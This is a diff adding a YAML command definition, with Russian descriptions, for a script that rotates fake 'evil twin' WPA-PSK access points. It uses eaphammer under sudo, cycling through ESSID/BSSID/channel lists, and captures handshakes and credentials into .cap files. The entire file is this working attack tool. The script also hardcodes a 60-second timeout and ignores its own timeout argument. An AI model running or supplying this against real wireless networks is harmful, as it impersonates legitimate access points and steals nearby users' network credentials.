@@ -1,0 +1,41 @@
+description: Поднимает поддельные точки доступа по таймауту
+tags:
+  - wpa-psk
+  - evil twin
+  - handshake
+
+arguments:
+  interface:
+    description: имя интерфейса wlan
+  list:
+    description: 'файлы со списками параметров точек доступа в формате "ESSID;BSSID;CHANNEL" (например: "FakeAP;2f:db:4c:70:74:74;8")'
+    multiple: true
+    replacer: '#list#'
+  t:
+    description: время в секундах для переключения между точками
+    default: '60'
+    replacer: '#timeout#'
+    metavar: SECONDS
+    regex: '[0-9]+'
+  d:
+    description: директория, куда скрипт будет складывать .cap файлы (их будет много!)
+    default: 'etwin-pulsar'
+    replacer: '#dir#'
+
+mode:
+  format:
+    interface: '{!r}'
+    list: '{!r}'
+    t: '{!r}'
+
+shell: bash
+
+script: >-
+  outdir=#dir#;
+  mkdir -p $outdir;
+  while true; do
+  for ap in $(cat #list# | sort -u); do 
+  sudo timeout -s INT 60 eaphammer --interface #interface# --essid $(echo $ap | awk -F ';' '{print $1}') --auth wpa-psk --password 00000000 --creds --psk-capture-file "$(realpath $outdir/pulsar-ap-$(date +%Y%m%d%H%M%S).cap)" --bssid $(echo $ap | awk -F ';' '{print $2}') --channel $(echo $ap | awk -F ';' '{print $3}');
+  done;
+  done
+  
